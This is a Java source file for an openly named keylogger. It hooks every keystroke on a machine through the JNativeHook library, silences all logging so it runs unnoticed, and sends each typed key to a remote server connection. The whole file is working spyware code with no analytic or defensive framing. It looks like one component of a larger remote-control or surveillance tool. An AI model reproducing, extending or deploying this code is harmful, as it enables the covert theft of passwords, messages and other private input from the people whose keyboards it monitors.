package keylogger;

import network.Connection;
import network.Message;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyLogger implements NativeKeyListener {

    boolean isRunning = false;
    Connection server;
    static KeyLogger instance;

    public static KeyLogger getInstance(Connection c) {
        if(instance == null) {
            instance = new KeyLogger(c);
        }
        return instance;
    }

    private KeyLogger(Connection c) {
        this.server = c;
        instance = this;

        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

        Handler[] handlers = Logger.getLogger("").getHandlers();
        for(int i = 0; i < handlers.length; i++) {
            handlers[i].setLevel(Level.OFF);
        }
    }

    public void start() {
        if(!isRunning) {
            try {
                GlobalScreen.addNativeKeyListener(instance);
                GlobalScreen.registerNativeHook();
            } catch(NativeHookException e) {
                // Silence is golden
                isRunning = false;
            }
            isRunning = true;
        }
    }

    public void stop() {
        if(isRunning) {
            try {
                GlobalScreen.removeNativeKeyListener(instance);
//                GlobalScreen.unregisterNativeHook();
                isRunning = false;
            } catch(Exception e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        Message keyPressed = new Message("key-typed", nativeKeyEvent);
        server.sendMessage(keyPressed);
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }
}
